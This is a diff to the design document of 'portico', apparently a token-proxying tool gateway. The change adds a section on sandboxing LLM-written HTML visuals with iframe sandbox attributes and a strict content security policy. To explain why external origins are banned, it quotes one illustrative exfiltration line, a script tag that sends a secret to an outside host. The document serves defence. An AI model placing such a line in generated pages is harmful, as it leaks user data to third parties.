@@ -7,8 +7,9 @@ identity core**:
    bearer token per user** and sees the aggregated, namespaced tools of every
    upstream MCP server that user has linked. portico holds each user's per-service
    OAuth tokens server-side (AES-256-GCM encrypted) and proxies calls through.
-2. **HTML artifact host** — clients publish rich HTML and get back a login-gated
-   URL to share (e.g. Jean posting a report into a Slack thread).
+2. **Visual host** — clients publish rich HTML and get back a login-gated URL to share
+   (e.g. Jean posting a chart into a Slack thread). The page may run JavaScript, so it is
+   served untrusted; see "The visual sandbox" below.
 
 A small React **portal** at `/` is the human surface for both: sign in with Google,
 link services, manage your token.
@@ -64,6 +65,38 @@ This separation is the core idea — it's what lets one token reach many service
 Because bearer tokens are stored hashed, an existing one can never be re-displayed.
 The portal's "generate new token" revokes every previous token and shows the new
 value exactly once.
+
+## The visual sandbox
+
+A published visual is HTML an LLM wrote. It runs JavaScript — that is the point, it is how
+a chart draws — so it is treated as hostile code and given two documents instead of one:
+
+| Route | Content | Trust |
+|---|---|---|
+| `/visual/:id` | Portico's own shell: a title bar and an `<iframe>`. No script of its own. | Trusted |
+| `/visual/:id/raw` | The stored artifact bytes. | **Untrusted** |
+
+The shell frames the artifact with `sandbox="allow-scripts"` and **not**
+`allow-same-origin`. That combination hands the artifact an *opaque* origin: its script
+cannot read the portico session cookie or `localStorage`, cannot see the shell document,
+and — with no `allow-top-navigation` — cannot redirect the tab. Granting `allow-scripts`
+and `allow-same-origin` together would let the framed page reach into its own DOM and
+delete that very attribute, so **they must never both appear**. This is the load-bearing
+invariant of the visual host; `visual-shell.test.ts` asserts it, and the Playwright suite
+observes a real browser enforce it.
+
+The artifact's CSP then removes every way out: `connect-src 'none'` (no fetch, XHR,
+WebSocket, or beacon) and no external origin anywhere in the policy. That second half
+matters more than it looks — an external `<script src="//host/?d=SECRET">` is an outbound
+GET carrying stolen data, so *any* permitted external origin is an exfiltration channel no
+matter how tight `connect-src` is. That is why CDNs are banned outright rather than
+allowlisted, and why ECharts and Mermaid are vendored same-origin under `/vendor/` at
+version-pinned, immutable paths: a visual hard-codes the path it was written against, so
+those bytes are never replaced, only added to. Script runs; nothing leaves.
+
+Both routes are session-gated and both run the full visibility check. `/raw` is a URL a
+person can paste into a browser, so it defends itself rather than trusting the shell to
+have done it.
 
 ## Adapter selection
 
